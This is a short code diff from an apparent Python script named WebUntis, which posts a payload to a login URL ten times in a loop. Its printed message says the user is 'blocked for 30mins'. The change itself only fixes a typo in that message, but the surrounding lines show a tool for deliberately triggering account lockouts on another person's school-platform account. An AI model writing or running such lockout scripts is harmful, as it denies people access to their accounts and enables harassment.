@@ -23,6 +23,6 @@ class WebUntis():
         for _ in range(10):
             with requests.Session() as session:
                 session.post(self.url, data=self.payload)
-        print("successfull blocked the user for 30mins")
+        print("successfully blocked the user for 30mins")
 
 WebUntis().main()
